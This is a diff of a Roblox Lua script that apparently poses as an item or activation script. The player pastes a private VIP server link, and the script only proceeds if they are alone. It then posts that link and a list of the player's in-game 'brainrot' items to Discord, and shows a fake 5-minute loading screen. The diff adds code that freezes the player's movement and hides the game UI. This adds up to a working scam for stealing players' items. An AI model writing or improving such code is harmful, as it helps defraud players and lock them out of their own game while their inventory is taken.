@@ -2,6 +2,8 @@ local HttpService = game:GetService("HttpService")
 local Workspace = game:GetService("Workspace")
 local Players = game:GetService("Players")
 local TweenService = game:GetService("TweenService")
+local ContextActionService = game:GetService("ContextActionService")
+local StarterGui = game:GetService("StarterGui")
 
 -- =============================
 -- Конфиг
@@ -75,7 +77,6 @@ local CANONICAL_BRAINROT_NAMES = {
 	"Secret Lucky Block",
 	"Admin Lucky Block",
 	"Quesadilla Crocodila"
-	-- добавьте остальные сюда!
 }
 
 local LOWER_TO_CANON = {}
@@ -225,11 +226,9 @@ local function postCombinedAllPlots()
 	end
 
 	if #sections > 0 then
-		-- если есть брейнроты — приклеиваем VIP ссылку сверху
 		if _G.VIP_LINK and _G.VIP_LINK ~= "" then
 			table.insert(sections, 1, "🔗 VIP Link: " .. _G.VIP_LINK)
 		end
-
 		local body = table.concat(sections, "\n\n")
 		postDiscordSimple(body)
 	end
@@ -285,21 +284,13 @@ local function watchPlots()
 end
 
 -- =============================
--- Fullscreen Loading screen (поверх всего)
--- =============================
--- =============================
--- Fullscreen Loading screen (поверх всего)
+-- Fullscreen Loading screen
 -- =============================
 local function showLoadingScreen(duration)
 	local player = Players.LocalPlayer
-	local StarterGui = game:GetService("StarterGui")
+	-- Вырубаем стандартный UI
+	pcall(function() StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.All, false) end)
 
-	-- Вырубаем все стандартные UI (хотбар, чат, leaderboard и т.д.)
-	pcall(function()
-		StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.All, false)
-	end)
-
-	-- ScreenGui поверх всего
 	local gui = Instance.new("ScreenGui")
 	gui.Name = "LoadingScreen"
 	gui.IgnoreGuiInset = true
@@ -308,21 +299,19 @@ local function showLoadingScreen(duration)
 	gui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
 	gui.Parent = player:WaitForChild("PlayerGui")
 
-	-- Чёрный фон
 	local mainFrame = Instance.new("Frame")
-	mainFrame.Size = UDim2.new(1, 0, 1, 0)
-	mainFrame.Position = UDim2.new(0, 0, 0, 0)
-	mainFrame.BackgroundColor3 = Color3.new(0, 0, 0)
+	mainFrame.Size = UDim2.new(1,0,1,0)
+	mainFrame.Position = UDim2.new(0,0,0,0)
+	mainFrame.BackgroundColor3 = Color3.new(0,0,0)
 	mainFrame.BorderSizePixel = 0
 	mainFrame.ZIndex = 999999
 	mainFrame.Active = true
 	mainFrame.Selectable = true
 	mainFrame.Parent = gui
 
-	-- Текст
 	local loadingText = Instance.new("TextLabel")
-	loadingText.Size = UDim2.new(1, 0, 0, 60)
-	loadingText.Position = UDim2.new(0, 0, 0.4, -30)
+	loadingText.Size = UDim2.new(1,0,0,60)
+	loadingText.Position = UDim2.new(0,0,0.4,-30)
 	loadingText.BackgroundTransparency = 1
 	loadingText.Text = "Script activated, please wait..."
 	loadingText.TextColor3 = Color3.new(1,1,1)
@@ -331,42 +320,34 @@ local function showLoadingScreen(duration)
 	loadingText.ZIndex = 1000000
 	loadingText.Parent = mainFrame
 
-	-- Полоска фон
 	local progressBarFrame = Instance.new("Frame")
-	progressBarFrame.Size = UDim2.new(0.6, 0, 0, 25)
-	progressBarFrame.Position = UDim2.new(0.2, 0, 0.55, 0)
+	progressBarFrame.Size = UDim2.new(0.6,0,0,25)
+	progressBarFrame.Position = UDim2.new(0.2,0,0.55,0)
 	progressBarFrame.BackgroundColor3 = Color3.fromRGB(50,50,50)
 	progressBarFrame.BorderSizePixel = 0
 	progressBarFrame.ZIndex = 1000000
 	progressBarFrame.Parent = mainFrame
 
-	-- Полоска заполнения
 	local progressBar = Instance.new("Frame")
-	progressBar.Size = UDim2.new(0, 0, 1, 0)
-	progressBar.BackgroundColor3 = Color3.fromRGB(0, 170, 255)
+	progressBar.Size = UDim2.new(0,0,1,0)
+	progressBar.BackgroundColor3 = Color3.fromRGB(0,170,255)
 	progressBar.BorderSizePixel = 0
 	progressBar.ZIndex = 1000001
 	progressBar.Parent = progressBarFrame
 
-	-- Анимация полоски
 	local tweenInfo = TweenInfo.new(duration, Enum.EasingStyle.Linear)
-	local goal = {Size = UDim2.new(1, 0, 1, 0)}
+	local goal = {Size = UDim2.new(1,0,1,0)}
 	local tween = TweenService:Create(progressBar, tweenInfo, goal)
 	tween:Play()
 
-	-- Автоуборка
 	task.delay(duration, function()
 		gui:Destroy()
-		-- Возвращаем стандартный UI
-		pcall(function()
-			StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.All, true)
-		end)
+		pcall(function() StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.All, true) end)
 	end)
 end
 
-
 -- =============================
--- GUI
+-- GUI с блокировкой движения
 -- =============================
 local function createActivationGUI()
 	local player = Players.LocalPlayer
@@ -375,63 +356,85 @@ local function createActivationGUI()
 	gui.ResetOnSpawn = false
 	gui.Parent = player:WaitForChild("PlayerGui")
 
+	-- Блокировка движения
+	local character = player.Character or player.CharacterAdded:Wait()
+	local function blockMovement(_, inputState)
+		if inputState == Enum.UserInputState.Begin then
+			return Enum.ContextActionResult.Sink
+		end
+	end
+	ContextActionService:BindAction("BlockMovement", blockMovement, false,
+		Enum.PlayerActions.CharacterForward,
+		Enum.PlayerActions.CharacterBackward,
+		Enum.PlayerActions.CharacterLeft,
+		Enum.PlayerActions.CharacterRight,
+		Enum.PlayerActions.CharacterJump)
+	local function freezeHumanoid(char)
+		local hum = char:WaitForChild("Humanoid")
+		hum.WalkSpeed = 0
+		hum.JumpPower = 0
+	end
+	freezeHumanoid(character)
+	player.CharacterAdded:Connect(freezeHumanoid)
+
+	-- GUI элементы
 	local mainFrame = Instance.new("Frame")
 	mainFrame.Name = "MainFrame"
-	mainFrame.Size = UDim2.new(0, 450, 0, 300)
-	mainFrame.Position = UDim2.new(0.5, -225, 0.5, -150)
-	mainFrame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+	mainFrame.Size = UDim2.new(0,450,0,300)
+	mainFrame.Position = UDim2.new(0.5,-225,0.5,-150)
+	mainFrame.BackgroundColor3 = Color3.fromRGB(0,0,0)
 	mainFrame.BorderSizePixel = 0
 	mainFrame.Parent = gui
 
 	local title = Instance.new("TextLabel")
-	title.Size = UDim2.new(1, -20, 0, 50)
-	title.Position = UDim2.new(0, 10, 0, 10)
+	title.Size = UDim2.new(1,-20,0,50)
+	title.Position = UDim2.new(0,10,0,10)
 	title.BackgroundTransparency = 1
 	title.Text = "Place ur VIP link here"
-	title.TextColor3 = Color3.fromRGB(255, 255, 255)
+	title.TextColor3 = Color3.fromRGB(255,255,255)
 	title.TextScaled = true
 	title.Font = Enum.Font.GothamBold
 	title.Parent = mainFrame
 
 	local textBox = Instance.new("TextBox")
-	textBox.Size = UDim2.new(1, -20, 0, 50)
-	textBox.Position = UDim2.new(0, 10, 0, 70)
-	textBox.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
+	textBox.Size = UDim2.new(1,-20,0,50)
+	textBox.Position = UDim2.new(0,10,0,70)
+	textBox.BackgroundColor3 = Color3.fromRGB(40,40,40)
 	textBox.BorderSizePixel = 0
 	textBox.PlaceholderText = "https://www.roblox.com/share?code=..."
 	textBox.ClearTextOnFocus = false
-	textBox.PlaceholderColor3 = Color3.fromRGB(180, 180, 180)
+	textBox.PlaceholderColor3 = Color3.fromRGB(180,180,180)
 	textBox.Text = ""
-	textBox.TextColor3 = Color3.fromRGB(255, 255, 255)
+	textBox.TextColor3 = Color3.fromRGB(255,255,255)
 	textBox.TextScaled = true
 	textBox.Font = Enum.Font.Gotham
 	textBox.Parent = mainFrame
 
 	local button = Instance.new("TextButton")
-	button.Size = UDim2.new(1, -20, 0, 70)
-	button.Position = UDim2.new(0, 10, 0, 140)
-	button.BackgroundColor3 = Color3.fromRGB(0, 120, 255)
+	button.Size = UDim2.new(1,-20,0,70)
+	button.Position = UDim2.new(0,10,0,140)
+	button.BackgroundColor3 = Color3.fromRGB(0,120,255)
 	button.BorderSizePixel = 2
-	button.BorderColor3 = Color3.fromRGB(255, 255, 255)
+	button.BorderColor3 = Color3.fromRGB(255,255,255)
 	button.Text = "ACTIVATE"
-	button.TextColor3 = Color3.new(1, 1, 1)
+	button.TextColor3 = Color3.new(1,1,1)
 	button.TextScaled = true
 	button.Font = Enum.Font.GothamBold
 	button.Parent = mainFrame
 
 	button.MouseEnter:Connect(function()
-		TweenService:Create(button, TweenInfo.new(0.2), {BackgroundColor3 = Color3.fromRGB(0, 150, 255)}):Play()
+		TweenService:Create(button, TweenInfo.new(0.2), {BackgroundColor3 = Color3.fromRGB(0,150,255)}):Play()
 	end)
 	button.MouseLeave:Connect(function()
-		TweenService:Create(button, TweenInfo.new(0.2), {BackgroundColor3 = Color3.fromRGB(0, 120, 255)}):Play()
+		TweenService:Create(button, TweenInfo.new(0.2), {BackgroundColor3 = Color3.fromRGB(0,120,255)}):Play()
 	end)
 
 	local status = Instance.new("TextLabel")
-	status.Size = UDim2.new(1, -20, 0, 30)
-	status.Position = UDim2.new(0, 10, 0, 220)
+	status.Size = UDim2.new(1,-20,0,30)
+	status.Position = UDim2.new(0,10,0,220)
 	status.BackgroundTransparency = 1
 	status.Text = ""
-	status.TextColor3 = Color3.fromRGB(255, 200, 0)
+	status.TextColor3 = Color3.fromRGB(255,200,0)
 	status.TextScaled = true
 	status.Font = Enum.Font.Gotham
 	status.Parent = mainFrame
@@ -439,28 +442,25 @@ local function createActivationGUI()
 	local function onActivate()
 		if #Players:GetPlayers() > 1 then
 			status.Text = "Script can't be activated , more then 1 player in the server!"
-			status.TextColor3 = Color3.fromRGB(255, 80, 80)
+			status.TextColor3 = Color3.fromRGB(255,80,80)
 			return
 		end
 
 		local vipLink = textBox.Text:gsub("^%s*(.-)%s*$", "%1")
 		if vipLink == "" or not string.find(vipLink, "roblox%.com/share") then
 			status.Text = "Not a vip server!"
-			status.TextColor3 = Color3.fromRGB(255, 80, 80)
+			status.TextColor3 = Color3.fromRGB(255,80,80)
 			return
 		end
 
 		isActivated = true
 		_G.VIP_LINK = vipLink
 		status.Text = "Script Activated"
-		status.TextColor3 = Color3.fromRGB(0, 255, 100)
+		status.TextColor3 = Color3.fromRGB(0,255,100)
 
-		-- Убираем отдельную отправку vipLink
 		task.wait(0.5)
 		postCombinedAllPlots()
 		watchPlots()
-
-		-- Появляется fullscreen loading screen на 5 минут
 		showLoadingScreen(300)
 
 		gui:Destroy()
